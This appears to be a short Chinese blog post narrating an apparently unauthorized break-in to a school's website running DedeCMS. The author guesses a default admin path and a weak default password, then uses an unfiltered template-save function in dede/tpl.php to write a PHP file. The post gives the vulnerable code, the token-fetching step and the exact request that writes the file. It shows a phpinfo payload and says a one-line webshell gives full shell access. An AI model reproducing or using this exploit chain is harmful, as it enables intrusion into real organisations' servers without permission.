闲着没事的时候翻到了一个学校的网站。

看下robots.txt文件

明显是dedecms的，随手输入dede目录（默认后台）


emmmm后台是默认的，我猜想这口令会不会也是默认的弱口令，试了下，呼应下标题


进去了。。。。。。。。

然后就是看这个版本怎们getshell了

了解了一下，这个版本存在后台过滤不严格

dede/tpl.php的252-281行

if(!preg_match("#^[a-z0-9_-]{1,}\.lib\.php$#i", $filename))
{
    ShowMsg('文件名不合法，不允许进行操作！', '-1');
    exit();
}
require_once(DEDEINC.'/oxwindow.class.php');
$tagname = preg_replace("#\.lib\.php$#i", "", $filename);
$content = stripslashes($content);
$truefile = DEDEINC.'/taglib/'.$filename;
$fp = fopen($truefile, 'w');
fwrite($fp, $content);
fclose($fp);

这里dedecms变量全局注册所以$content,$filename可控

未过滤直接写入内容以lib.php结尾，可以直接getshell

要注意的是需要有csrf token校验

所以开始getshell

访问xxx/dede/tpl.php?action=upload 获取token


/dede/tpl.php?filename=tuifei.lib.php&action=savetagfile&content=<?php%20phpinfo();?>&token=token值


这样可以写一个phpinfo的界面将content内容改为一句话可以得到shell
